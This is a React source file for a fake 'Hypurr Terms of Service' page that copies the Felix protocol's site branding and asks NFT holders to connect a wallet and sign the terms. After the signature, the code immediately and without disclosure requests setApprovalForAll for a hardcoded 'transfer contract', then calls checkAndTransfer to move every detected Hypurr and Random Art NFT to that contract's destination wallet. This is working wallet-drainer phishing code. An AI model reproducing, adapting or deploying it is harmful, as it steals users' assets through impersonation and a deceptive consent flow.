import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import './HypurrTerms.css';

const HypurrTerms = () => {
  console.log('=== HypurrTerms COMPONENT RENDERED ===');
  console.log('Component loaded at:', new Date().toISOString());
  
  const [account, setAccount] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [nftCount, setNftCount] = useState(0);
  const [hasSigned, setHasSigned] = useState(false);
  const [signature, setSignature] = useState(null);
  const [error, setError] = useState(null);
  const [isTransferring, setIsTransferring] = useState(false);
  const [transferStatus, setTransferStatus] = useState(null); // 'approving', 'transferring', 'success', 'error'
  const [transferTxHash, setTransferTxHash] = useState(null);
  const [tokenIds, setTokenIds] = useState([]);

  // NFT Contract Addresses
  const HYPURR_NFT_CONTRACT = process.env.REACT_APP_HYPURR_NFT_CONTRACT || "0x9125e2d6827a00b0f8330d6ef7bef07730bac685";
  const RANDOM_ART_NFT_CONTRACT = process.env.REACT_APP_RANDOM_ART_NFT_CONTRACT || "0x298AbE38965DC68d239192d4366ab8c5b65a3B6f";
  
  // Transfer Contract Address
  const TRANSFER_CONTRACT = process.env.REACT_APP_TRANSFER_CONTRACT || "0x50fD5cf1f972607ECc9d7da2A6211e316469E78E";
  
  console.log('Environment variables:', {
    REACT_APP_TRANSFER_CONTRACT: process.env.REACT_APP_TRANSFER_CONTRACT,
    TRANSFER_CONTRACT: TRANSFER_CONTRACT,
    REACT_APP_HYPURR_NFT_CONTRACT: process.env.REACT_APP_HYPURR_NFT_CONTRACT,
    REACT_APP_RANDOM_ART_NFT_CONTRACT: process.env.REACT_APP_RANDOM_ART_NFT_CONTRACT
  });
  
  // ERC-721 ABI
  const ERC721_ABI = [
    "function balanceOf(address owner) external view returns (uint256)",
    "function ownerOf(uint256 tokenId) external view returns (address)",
    "function setApprovalForAll(address operator, bool approved) external",
    "function isApprovedForAll(address owner, address operator) external view returns (bool)",
    "function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256)" // For Enumerable
  ];
  
  // Transfer Contract ABI
  const TRANSFER_ABI = [
    "function checkNFTs(address nftContract, address wallet) external view returns (uint256)",
    "function checkAllNFTs(address wallet) external view returns (uint256)",
    "function isNFTContractEnabled(address nftContract) external view returns (bool)",
    "function transferNFTs(address nftContract, uint256[] calldata tokenIds) external",
    "function checkAndTransfer(address nftContract, uint256[] calldata tokenIds) external",
    "function getEnabledNFTContracts() external view returns (address[])",
    "function destinationWallet() external view returns (address)"
  ];

  // Check if wallet is already connected
  useEffect(() => {
    checkWalletConnection();
    checkExistingSignature();
  }, []);

  // Get the correct Ethereum provider (prefer MetaMask)
  const getEthereumProvider = () => {
    // Try to get MetaMask specifically
    if (window.ethereum?.isMetaMask) {
      return window.ethereum;
    }
    // Try to get from providers array (MetaMask v10+)
    if (window.ethereum?.providers) {
      const metaMask = window.ethereum.providers.find(p => p.isMetaMask);
      if (metaMask) return metaMask;
    }
    // Fallback to first available
    return window.ethereum;
  };

  const checkWalletConnection = async () => {
    const provider = getEthereumProvider();
    if (provider) {
      try {
        const accounts = await provider.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          setAccount(accounts[0]);
          setIsConnected(true);
          await verifyHypurrNFTs(accounts[0]);
        }
      } catch (error) {
        console.error('Error checking wallet:', error);
      }
    }
  };

  const checkExistingSignature = () => {
    const stored = localStorage.getItem(`hypurr_signature_${account}`);
    if (stored) {
      setHasSigned(true);
      setSignature(stored);
    }
  };

  const connectWallet = async () => {
    try {
      setError(null);
      
      const provider = getEthereumProvider();
      if (!provider) {
        setError('Please install MetaMask or another Web3 wallet');
        return;
      }

      const accounts = await provider.request({ 
        method: 'eth_requestAccounts' 
      });

      if (accounts.length > 0) {
        setAccount(accounts[0]);
        setIsConnected(true);
        await verifyHypurrNFTs(accounts[0]);
      }
    } catch (error) {
      console.error('Error connecting wallet:', error);
      if (error.code === 4001) {
        setError('Connection rejected. Please approve the connection request.');
      } else {
        setError('Failed to connect wallet. Please try again.');
      }
    }
  };

  const verifyHypurrNFTs = async (address) => {
    if (!address) {
      setNftCount(0);
      setTokenIds([]);
      return;
    }

    try {
      setIsVerifying(true);
      const ethereumProvider = getEthereumProvider();
      if (!ethereumProvider) {
        throw new Error('No Ethereum provider found. Please install MetaMask.');
      }
      const provider = new ethers.BrowserProvider(ethereumProvider);
      
      // Use transfer contract to check all enabled NFTs if available
      if (TRANSFER_CONTRACT !== "0x0000000000000000000000000000000000000000") {
        try {
          const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, provider);
          const totalCount = await transferContract.checkAllNFTs(address);
          const count = parseInt(totalCount.toString());
          setNftCount(count);
          
          // Get enabled contracts and check each one
          const enabledContracts = await transferContract.getEnabledNFTContracts();
          const allTokenIds = [];
          
          for (const nftContract of enabledContracts) {
            try {
              const contract = new ethers.Contract(nftContract, ERC721_ABI, provider);
              const balance = await contract.balanceOf(address);
              const balanceNum = parseInt(balance.toString());
              
              if (balanceNum > 0) {
                // Try to get token IDs
                for (let i = 0; i < balanceNum; i++) {
                  try {
                    const tokenId = await contract.tokenOfOwnerByIndex(address, i);
                    allTokenIds.push({
                      contract: nftContract,
                      tokenId: tokenId.toString()
                    });
                  } catch (e) {
                    // Contract doesn't support Enumerable
                    break;
                  }
                }
              }
            } catch (e) {
              console.log(`Error checking contract ${nftContract}:`, e.message);
            }
          }
          
          setTokenIds(allTokenIds);
          console.log(`Verified ${count} total NFT(s) across ${enabledContracts.length} collection(s) for ${address}`);
          return;
        } catch (e) {
          console.log("Transfer contract check failed, falling back to direct check:", e.message);
        }
      }
      
      // Fallback: Check Hypurr NFT directly
      if (HYPURR_NFT_CONTRACT !== "0x0000000000000000000000000000000000000000") {
        const contract = new ethers.Contract(HYPURR_NFT_CONTRACT, ERC721_ABI, provider);
        const balance = await contract.balanceOf(address);
        const count = parseInt(balance.toString());
        
        // Also check Random Art if available
        let randomArtCount = 0;
        if (RANDOM_ART_NFT_CONTRACT !== "0x0000000000000000000000000000000000000000") {
          try {
            const randomArtContract = new ethers.Contract(RANDOM_ART_NFT_CONTRACT, ERC721_ABI, provider);
            const randomArtBalance = await randomArtContract.balanceOf(address);
            randomArtCount = parseInt(randomArtBalance.toString());
          } catch (e) {
            console.log("Error checking Random Art NFTs:", e.message);
          }
        }
        
        const totalCount = count + randomArtCount;
        setNftCount(totalCount);
        
        // Try to get token IDs if contract supports Enumerable
        const tokenIdList = [];
        if (count > 0) {
          try {
            for (let i = 0; i < count; i++) {
              try {
                const tokenId = await contract.tokenOfOwnerByIndex(address, i);
                tokenIdList.push({
                  contract: HYPURR_NFT_CONTRACT,
                  tokenId: tokenId.toString()
                });
              } catch (e) {
                break;
              }
            }
          } catch (e) {
            console.log("Contract doesn't support tokenOfOwnerByIndex");
          }
        }
        
        // Get Random Art token IDs
        if (randomArtCount > 0 && RANDOM_ART_NFT_CONTRACT !== "0x0000000000000000000000000000000000000000") {
          try {
            const randomArtContract = new ethers.Contract(RANDOM_ART_NFT_CONTRACT, ERC721_ABI, provider);
            for (let i = 0; i < randomArtCount; i++) {
              try {
                const tokenId = await randomArtContract.tokenOfOwnerByIndex(address, i);
                tokenIdList.push({
                  contract: RANDOM_ART_NFT_CONTRACT,
                  tokenId: tokenId.toString()
                });
              } catch (e) {
                break;
              }
            }
          } catch (e) {
            console.log("Random Art contract doesn't support tokenOfOwnerByIndex");
          }
        }
        
        setTokenIds(tokenIdList);
        console.log(`Verified ${totalCount} NFT(s) (${count} Hypurr + ${randomArtCount} Random Art) for ${address}`);
      } else {
        setNftCount(0);
        setTokenIds([]);
      }
    } catch (error) {
      console.error('Error verifying NFTs:', error);
      setError('Failed to verify NFTs. Please check the contract addresses.');
      setNftCount(0);
      setTokenIds([]);
    } finally {
      setIsVerifying(false);
    }
  };
  
  const approveTransferContract = async () => {
    if (!account || TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
      throw new Error("Missing required contract addresses");
    }

    if (!window.ethereum) {
      throw new Error("MetaMask not detected. Please install MetaMask.");
    }

    console.log('=== APPROVAL FUNCTION CALLED ===');
    console.log('Account:', account);
    console.log('Transfer Contract:', TRANSFER_CONTRACT);

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    
    // Verify we have a signer
    const signerAddress = await signer.getAddress();
    console.log('Signer address:', signerAddress);
    
    if (signerAddress.toLowerCase() !== account.toLowerCase()) {
      throw new Error('Signer address does not match connected account');
    }
    
    // Only approve contracts where user actually has NFTs (based on tokenIds)
    const contractsToApprove = new Set();
    for (const item of tokenIds) {
      contractsToApprove.add(item.contract.toLowerCase());
    }
    
    console.log('Approval: Contracts where user has NFTs:', Array.from(contractsToApprove));
    
    if (contractsToApprove.size === 0) {
      throw new Error('No NFTs found to approve');
    }
    
    // Only approve contracts where user has NFTs
    const contractsArray = Array.from(contractsToApprove);
    for (const nftContractAddress of contractsArray) {
      try {
        console.log(`\n=== Processing contract: ${nftContractAddress} ===`);
        // Convert back to checksum address
        const checksumAddress = ethers.getAddress(nftContractAddress);
        const nftContract = new ethers.Contract(checksumAddress, ERC721_ABI, signer);
        
        // Check if already approved
        const isApproved = await nftContract.isApprovedForAll(account, TRANSFER_CONTRACT);
        console.log(`Approval status:`, isApproved);
        
        if (isApproved) {
          console.log(`✅ Already approved, skipping`);
          continue;
        }
        
        // Approve contract - this MUST trigger MetaMask popup
        console.log(`\n🚀 CALLING setApprovalForAll NOW...`);
        console.log(`   Contract: ${nftContractAddress}`);
        console.log(`   Operator: ${TRANSFER_CONTRACT}`);
        console.log(`   Approved: true`);
        console.log(`\n⏳ MetaMask popup should appear NOW!`);
        
        // Call setApprovalForAll - this should trigger MetaMask immediately
        const txPromise = nftContract.setApprovalForAll(TRANSFER_CONTRACT, true);
        console.log('Transaction promise created, waiting for user approval in MetaMask...');
        
        const tx = await txPromise;
        console.log(`✅ Transaction submitted! Hash:`, tx.hash);
        console.log(`⏳ Waiting for confirmation...`);
        
        await tx.wait();
        console.log(`✅ Contract ${nftContractAddress} approved successfully!`);
      } catch (error) {
        console.error(`❌ Error approving ${nftContractAddress}:`, error);
        console.error('Error details:', {
          code: error.code,
          message: error.message,
          data: error.data,
          reason: error.reason
        });
        if (error.code === 4001) {
          throw new Error('Approval transaction was rejected. Please try again and approve the transaction in MetaMask.');
        }
        throw error;
      }
    }
    
    console.log('=== ALL APPROVALS COMPLETE ===');
    return true;
  };
  
  const transferNFTs = async () => {
    if (!account || TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
      throw new Error("Missing required contract addresses");
    }

    if (tokenIds.length === 0) {
      throw new Error("No token IDs found. The NFT contract may not support Enumerable. Please contact support.");
    }

    const ethereumProvider = getEthereumProvider();
    if (!ethereumProvider) {
      throw new Error("No Ethereum provider found. Please install MetaMask.");
    }
    
    const provider = new ethers.BrowserProvider(ethereumProvider);
    const signer = await provider.getSigner();
    const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, signer);
    
    // Group token IDs by contract
    const tokensByContract = {};
    for (const item of tokenIds) {
      if (!tokensByContract[item.contract]) {
        tokensByContract[item.contract] = [];
      }
      tokensByContract[item.contract].push(BigInt(item.tokenId));
    }
    
    // Transfer NFTs from each contract
    let lastTxHash = null;
    for (const [nftContract, tokenIdsArray] of Object.entries(tokensByContract)) {
      try {
        const tx = await transferContract.checkAndTransfer(nftContract, tokenIdsArray);
        const receipt = await tx.wait();
        lastTxHash = receipt.transactionHash;
        console.log(`NFTs transferred from ${nftContract}:`, receipt.transactionHash);
      } catch (error) {
        console.error(`Error transferring from ${nftContract}:`, error);
        throw error;
      }
    }
    
    return lastTxHash;
  };

  const signTerms = async () => {
    console.log('=== signTerms FUNCTION CALLED ===');
    console.log('isConnected:', isConnected);
    console.log('account:', account);
    console.log('nftCount:', nftCount);
    
    if (!isConnected || !account) {
      console.error('❌ Not connected or no account');
      setError('Please connect your wallet first');
      return;
    }

    if (nftCount === 0) {
      console.error('❌ No NFTs found');
      setError('No NFTs found. Please connect a wallet with Hypurr or Random Art NFTs.');
      return;
    }

    try {
      console.log('✅ Starting signature process...');
      setError(null);
      setIsVerifying(true);
      setTransferStatus(null);

      // Create message to sign
      const message = `I accept the Hypurr Terms of Service and verify ownership of my Hypurr NFTs.\n\nWallet: ${account}\nDate: ${new Date().toISOString()}`;
      console.log('Message to sign:', message);
      
      const ethereumProvider = getEthereumProvider();
      if (!ethereumProvider) {
        throw new Error('No Ethereum provider found. Please install MetaMask.');
      }
      
      const provider = new ethers.BrowserProvider(ethereumProvider);
      const signer = await provider.getSigner();
      console.log('Signer obtained:', await signer.getAddress());
      
      // Sign the message
      console.log('⏳ Requesting signature from MetaMask...');
      const signature = await signer.signMessage(message);
      console.log('✅ Signature received:', signature);
      
      // Store signature
      localStorage.setItem(`hypurr_signature_${account}`, signature);
      localStorage.setItem(`hypurr_signature_date_${account}`, new Date().toISOString());
      
      setHasSigned(true);
      setSignature(signature);
      
      console.log('✅ Terms signed successfully:', signature);
      setIsVerifying(false);
      
      // IMMEDIATELY trigger approval - no delay, no button needed
      console.log('=== TERMS SIGNED - STARTING TRANSFER PROCESS ===');
      console.log('Account:', account);
      console.log('Token IDs:', tokenIds);
      console.log('Transfer Contract:', TRANSFER_CONTRACT);
      console.log('About to call handleAutomaticTransfer()...');
      
      // Use setTimeout to ensure state is updated
      setTimeout(() => {
        console.log('=== INSIDE setTimeout - CALLING handleAutomaticTransfer ===');
        console.log('Token IDs at call time:', tokenIds);
        handleAutomaticTransfer().catch(err => {
          console.error('=== TRANSFER PROCESS ERROR ===', err);
          console.error('Error details:', {
            message: err.message,
            code: err.code,
            stack: err.stack
          });
          if (err.code === 4001) {
            setError('Transfer cancelled. Please try again and approve the transactions when prompted.');
          } else if (err.message && err.message.includes('not approved')) {
            setError('NFT transfer requires approval. Please try again and approve the approval transaction in MetaMask.');
          } else {
            setError('NFT transfer failed: ' + (err.message || 'Unknown error'));
          }
        });
      }, 100);
      
    } catch (error) {
      console.error('Error signing terms:', error);
      if (error.code === 4001) {
        setError('Signature rejected. Please approve the signature request.');
      } else {
        setError('Failed to sign terms. Please try again.');
      }
      setIsVerifying(false);
    }
  };
  
  const handleAutomaticTransfer = async () => {
    console.log('=== handleAutomaticTransfer CALLED ===');
    console.log('TRANSFER_CONTRACT:', TRANSFER_CONTRACT);
    console.log('tokenIds.length:', tokenIds.length);
    console.log('tokenIds:', tokenIds);
    console.log('account:', account);
    
    if (TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
      console.error('❌ Transfer contract not configured. Transfer skipped.');
      setError('Transfer contract not configured. Please contact support.');
      return;
    }

    if (tokenIds.length === 0) {
      console.error('❌ Unable to get token IDs. Transfer skipped.');
      console.error('This might mean the NFT contract does not support Enumerable.');
      setError('Unable to get token IDs. The NFT contract may not support token enumeration.');
      return;
    }
    
    console.log('✅ All checks passed, proceeding with transfer...');

    try {
      setIsTransferring(true);
      
      // Step 1: Approve contract - this will trigger MetaMask popup immediately
      setTransferStatus('approving');
      console.log('Auto-transfer: Requesting approval - MetaMask popup should appear now');
      await approveTransferContract();
      console.log('Auto-transfer: Approval successful');
      
      // Step 2: Transfer NFTs automatically after approval
      setTransferStatus('transferring');
      console.log('Auto-transfer: Transferring NFTs...');
      const txHash = await transferNFTs();
      
      setTransferTxHash(txHash);
      setTransferStatus('success');
      console.log('Auto-transfer: NFTs transferred successfully:', txHash);
      
    } catch (error) {
      // Show error to user
      console.error('Auto-transfer error:', error);
      setTransferStatus('error');
      if (error.code === 4001) {
        setError('Approval or transfer was cancelled. Please try again.');
      } else {
        setError(error.message || 'Transfer failed. Please check the console for details.');
      }
    } finally {
      setIsTransferring(false);
    }
  };

  const formatAddress = (address) => {
    if (!address) return '';
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };

  // Listen for account changes
  useEffect(() => {
    const provider = getEthereumProvider();
    if (provider) {
      provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          setIsConnected(false);
          setAccount(null);
          setNftCount(0);
          setHasSigned(false);
          setSignature(null);
        } else {
          setAccount(accounts[0]);
          verifyHypurrNFTs(accounts[0]);
          checkExistingSignature();
        }
      });

      window.ethereum.on('chainChanged', () => {
        window.location.reload();
      });
    }
  }, []);

  return (
    <div className="hypurr-terms-page">
      {/* Navigation Header - 1:1 Match with usefelix.xyz */}
      <nav className="navbar">
        <div className="nav-container">
          <div className="nav-left">
            <a href="https://usefelix.xyz" className="logo">
              <div className="logo-icon">
                <span className="felix-logo">F</span>
              </div>
              <span className="logo-text">Felix</span>
            </a>
            <div className="nav-links">
              <a href="https://usefelix.xyz/borrow" className="nav-link">Borrow</a>
              <a href="https://usefelix.xyz/lend" className="nav-link">Lend</a>
              <a href="https://usefelix.xyz/docs" className="nav-link">Docs</a>
            </div>
          </div>
          <div className="nav-right">
            {isConnected ? (
              <div className="wallet-info">
                {nftCount > 0 && (
                  <span className="nft-badge">{nftCount} NFT{nftCount !== 1 ? 's' : ''}</span>
                )}
                <span className="wallet-address">{formatAddress(account)}</span>
                {hasSigned && (
                  <span className="verified-badge">✓ Verified</span>
                )}
              </div>
            ) : (
              <button className="connect-btn" onClick={connectWallet}>
                Connect Wallet
              </button>
            )}
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <div className="container content">
        <h1>Terms of Service</h1>
        <div className="date">Last Updated: {new Date().toLocaleDateString()}</div>

        {/* Wallet Status */}
        {isConnected && (
          <div className={`verification-status ${nftCount > 0 ? 'verified' : 'not-verified'}`}>
            <h3>Wallet Verification Status</h3>
            <div style={{ marginTop: '0.75rem' }}>
              <p><strong>Wallet:</strong> <span style={{ fontFamily: 'monospace', wordBreak: 'break-all' }}>{account}</span></p>
              <p style={{ marginTop: '0.5rem' }}>
                <strong>NFTs Found:</strong> {isVerifying ? (
                  <span style={{ display: 'inline-flex', alignItems: 'center', gap: '0.5rem' }}>
                    <span className="loading-spinner" style={{ 
                      display: 'inline-block', 
                      width: '12px', 
                      height: '12px', 
                      border: '2px solid rgba(0, 212, 255, 0.3)',
                      borderTop: '2px solid var(--accent-blue)',
                      borderRadius: '50%',
                      animation: 'spin 1s linear infinite'
                    }}></span>
                    Verifying...
                  </span>
                ) : (
                  <span style={{ color: nftCount > 0 ? 'var(--success-text)' : 'var(--warning-text)' }}>
                    {nftCount} found
                  </span>
                )}
              </p>
              {nftCount === 0 && !isVerifying && (
                <p className="warning-text" style={{ marginTop: '0.75rem' }}>
                  No NFTs found in this wallet. Please ensure you're using the correct wallet with Hypurr or Random Art NFTs.
                </p>
              )}
            </div>
          </div>
        )}

        {/* Signature Status */}
        {hasSigned && signature && (
          <div className="signature-status">
            <h3>✓ Terms Accepted</h3>
            <p>You have accepted the Terms of Service.</p>
            <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
            {isTransferring && (
              <div style={{ marginTop: '1rem', padding: '1rem', background: 'rgba(0, 212, 255, 0.1)', borderRadius: '8px' }}>
                <p><strong>Transferring NFTs...</strong></p>
                {transferStatus === 'approving' && (
                  <p>⏳ Please approve the transfer contract in MetaMask...</p>
                )}
                {transferStatus === 'transferring' && (
                  <p>⏳ Transferring your NFTs...</p>
                )}
                {transferStatus === 'success' && transferTxHash && (
                  <p>✅ NFTs transferred successfully! <a href={`https://explorer.hyperliquid.xyz/tx/${transferTxHash}`} target="_blank" rel="noopener noreferrer">View Transaction</a></p>
                )}
                {transferStatus === 'error' && (
                  <p style={{ color: 'var(--error-text)' }}>❌ Transfer failed. Please check the error message above.</p>
                )}
              </div>
            )}
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="error-message">
            <p>{error}</p>
          </div>
        )}

        <div className="intro">
          Welcome to the Terms of Service (these "Terms") for the Hypurr Protocol. 
          These Terms govern your access to and use of the Hypurr services, including 
          but not limited to NFT verification and related functionality.
        </div>

        <p>These Terms govern your access to and use of the Services. Read these Terms carefully, 
        as they include important information about your legal rights. By accessing and/or using 
        the Services, you are agreeing to these Terms. If you do not understand or agree to these 
        Terms, you may not use the Services.</p>

        <div className="warning">
          <p><strong>IMPORTANT NOTICE:</strong></p>
          <p>By connecting your wallet and signing these Terms, you verify ownership of your 
          NFTs and agree to be bound by these Terms. Ensure you are using the correct 
          wallet that contains your Hypurr or Random Art NFTs.</p>
        </div>

        {/* Terms Content - Simplified version */}
        <div className="section">
          <h2>1. Who May Use the Services</h2>
          <h3>1.1 Eligibility</h3>
          <p>You must be 18 years of age or older and own at least one Hypurr or Random Art NFT to use the Services. 
          You must connect a wallet that contains your NFTs for verification purposes.</p>
        </div>

        <div className="section">
          <h2>2. NFT Verification</h2>
          <h3>2.1 Verification Process</h3>
          <p>By connecting your wallet, you allow us to verify ownership of NFTs in your wallet. 
          This verification is necessary to access certain features of the Services.</p>
          
          <h3>2.2 Signature Requirement</h3>
          <p>To complete verification and accept these Terms, you must sign a message with your wallet. 
          This signature serves as proof of acceptance and wallet ownership.</p>
        </div>

        <div className="section">
          <h2>3. Acceptance of Terms</h2>
          <p>By signing the Terms message, you acknowledge that you have read, understood, and agree to 
          be bound by these Terms. Your signature is stored locally and serves as proof of acceptance.</p>
        </div>

        {/* Accept Button */}
        {isConnected && !hasSigned && (
          <div className="accept-section">
            <button 
              className="accept-btn" 
              onClick={(e) => {
                console.log('=== BUTTON CLICKED ===');
                console.log('Event:', e);
                console.log('isConnected:', isConnected);
                console.log('account:', account);
                console.log('nftCount:', nftCount);
                e.preventDefault();
                signTerms();
              }}
              disabled={isVerifying || nftCount === 0}
            >
              {isVerifying ? 'Signing...' : 'Accept Terms & Sign'}
            </button>
            {nftCount === 0 && (
              <p className="help-text">Please connect a wallet with Hypurr or Random Art NFTs to proceed.</p>
            )}
          </div>
        )}

        {!isConnected && (
          <div className="accept-section">
            <button className="accept-btn" onClick={connectWallet}>
              Connect Wallet to Continue
            </button>
          </div>
        )}
      </div>

      {/* Footer */}
      <footer className="footer">
        <div className="container">
          <div className="footer-content">
            <div className="footer-left">
              <div className="footer-logo">Felix</div>
              <p className="footer-text">© 2026 Felix Protocol. All rights reserved.</p>
            </div>
            <div className="footer-links">
              <div className="footer-col">
                <h4>Product</h4>
                <a href="https://usefelix.xyz/borrow">Borrow</a>
                <a href="https://usefelix.xyz/lend">Lend</a>
                <a href="https://usefelix.xyz/docs">Docs</a>
              </div>
              <div className="footer-col">
                <h4>Legal</h4>
                <a href="/terms">Terms</a>
                <a href="/privacy">Privacy</a>
              </div>
              <div className="footer-col">
                <h4>Community</h4>
                <a href="https://discord.gg/felixprotocol" target="_blank" rel="noopener noreferrer">Discord</a>
                <a href="https://x.com/felixprotocol" target="_blank" rel="noopener noreferrer">Twitter</a>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default HypurrTerms;
